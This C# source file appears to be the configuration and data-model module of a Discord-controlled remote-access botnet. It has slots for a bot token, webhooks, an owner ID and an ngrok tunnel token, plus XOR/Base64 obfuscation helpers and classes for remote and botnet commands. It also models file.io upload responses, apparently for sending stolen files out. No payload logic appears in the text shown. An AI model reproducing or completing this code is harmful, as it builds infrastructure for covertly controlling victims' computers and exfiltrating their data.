using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Configuration;
using Microsoft.Win32;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Buffers.Text;
using System.Runtime.CompilerServices;
using System.Diagnostics;
using Windows.UI.Notifications;

namespace s1l14lx3
{
    public static class Import
    {
        //System Config
        public static string ID = "";
        public static string Webhook = "";
        public static string ChannelID = "";
        public static string Dir = Directory.GetCurrentDirectory() + @"\";
        public static string MePath = Assembly.GetEntryAssembly().Location;
        //end

        //User Config
        public static string GUILDID = "";            //discord server ID
        public static string MainChannelID = "";      //discord server main channel ID
        public static string MainChannelWebhook = ""; //Main channel Webhook
        public static string DISCORDTOKEN = "";       //discord bot token
        public static string PARENTUSERID = "";       //Your discord ID
        public static string NGROKTOKEN = "";         //ngrok authtoken
        //end
    }
    public class Tools
    {
        public static void Wait()
        {
            using var manualResetEventSlim = new ManualResetEventSlim();
            Console.CancelKeyPress += (sender, e) =>
            {
                e.Cancel = true;
                manualResetEventSlim.Set();
            };
            manualResetEventSlim.Wait();
        }
        public static string XOREncode(string rawData, byte key)
        {
            byte[] raw = Encoding.UTF8.GetBytes(rawData);
            byte[] data = new Byte[raw.Length];
            for (int i = 0; i < raw.Length; i++)
            {
                data[i] = (byte)(raw[i] ^ key);
            }
            return Convert.ToBase64String(data);
        }
        public static string XORDecode(string rawData, byte key)
        {
            byte[] raw = Convert.FromBase64String(rawData);
            byte[] data = new Byte[raw.Length];
            for (int i = 0; i < raw.Length; i++)
            {
                data[i] = (byte)(raw[i] ^ key);
            }
            return Encoding.UTF8.GetString(data);
        }
        public static string Base64Decode(string Encoded)
        {
            byte[] raw = Convert.FromBase64String(Encoded);
            return Encoding.UTF8.GetString(raw);
        }
        public static void ShowToast(string Text)
        {
            var type = ToastTemplateType.ToastText01;
            var content = ToastNotificationManager.GetTemplateContent(type);
            var text = content.GetElementsByTagName("text").First();
            text.AppendChild(content.CreateTextNode(Text));
            var notifier = ToastNotificationManager.CreateToastNotifier("Message");
            notifier.Show(new ToastNotification(content));
        }
    }
    public class RemoteCommand
    {
        public string Command { get; set; }
        public string Option { get; set; }
        public int Roop { set; get; }
    }
    public class ALLRemoteCommand
    {
        public string Command { get; set; }
        public string Option { get; set; }
        public int Roop { set; get; }
    }
    public class BotNetCommand
    {
        public string Command { get; set; }
        public string Option { get; set; }
        public int Roop { set; get; }
    }
    public class FileIoRes
    {
        public string success { get; set; }
        public string status { get; set; }
        public string id { get; set; }
        public string key { get; set; }
        public string path { get; set; }
        public string nodeType { get; set; }
        public string name { get; set; }
        public string title { get; set; }
        public string description { get; set; }
        public string size { get; set; }
        public string link { get; set; }
        public string Private { get; set; }
        public string expires { get; set; }
        public string downloads { get; set; }
        public string maxDownloads { get; set; }
        public string autoDelete { get; set; }
        public string planId { get; set; }
        public string screeningStatus { get; set; }
        public string mimeType { get; set; }
        public string created { get; set; }
        public string modified { get; set; }
    }
}
